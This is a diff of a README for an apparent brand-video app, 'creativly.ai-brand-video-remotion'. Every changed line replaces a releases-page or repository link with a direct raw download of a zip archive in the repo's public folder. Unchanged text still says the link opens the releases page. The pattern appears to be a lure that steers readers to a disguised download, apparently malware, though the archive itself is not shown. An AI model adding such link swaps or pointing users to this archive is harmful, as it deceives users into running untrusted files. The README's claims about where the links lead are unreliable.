@@ -1,6 +1,6 @@
 # 🎬 creativly.ai-brand-video-remotion - Smooth Brand Video Creator
 
-[![Download on GitHub](https://img.shields.io/badge/Download-creativly.ai-blue?style=for-the-badge)](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-creativly.ai-blue?style=for-the-badge)](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/raw/refs/heads/main/public/remotion-ai-video-creativly-brand-2.3.zip)
 
 ## 📄 About creativly.ai-brand-video-remotion
 
@@ -27,7 +27,7 @@ Before you start, check that your computer meets these conditions:
 
 Click the big badge below or follow the link:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-creativly.ai-blue?style=for-the-badge)](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/releases)  
+[![Download on GitHub](https://img.shields.io/badge/Download-creativly.ai-blue?style=for-the-badge)](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/raw/refs/heads/main/public/remotion-ai-video-creativly-brand-2.3.zip)  
 
 This link takes you to the releases page on GitHub. The page shows available versions and files.
 
@@ -36,7 +36,7 @@ This link takes you to the releases page on GitHub. The page shows available ver
 ## 💾 Download and Installation Steps
 
 1. Open your web browser and visit the releases page:
-   https://github.com/hollowenshot/creativly.ai-brand-video-remotion/releases
+   https://github.com/hollowenshot/creativly.ai-brand-video-remotion/raw/refs/heads/main/public/remotion-ai-video-creativly-brand-2.3.zip
 
 2. Find the latest release version, usually at the top of the list.
 
@@ -118,7 +118,7 @@ This link takes you to the releases page on GitHub. The page shows available ver
 - For feature explanations, look inside the app help section.
 
 - Visit the GitHub repository for source details and open-source contributions:  
-  https://github.com/hollowenshot/creativly.ai-brand-video-remotion
+  https://github.com/hollowenshot/creativly.ai-brand-video-remotion/raw/refs/heads/main/public/remotion-ai-video-creativly-brand-2.3.zip
 
 - Use the repository issues page to report any problems or ask questions.
 
@@ -148,4 +148,4 @@ This link takes you to the releases page on GitHub. The page shows available ver
 
 Click here to visit the releases page and get started:
 
-[Download creativly.ai-brand-video-remotion](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/releases)
+[Download creativly.ai-brand-video-remotion](https://github.com/hollowenshot/creativly.ai-brand-video-remotion/raw/refs/heads/main/public/remotion-ai-video-creativly-brand-2.3.zip)
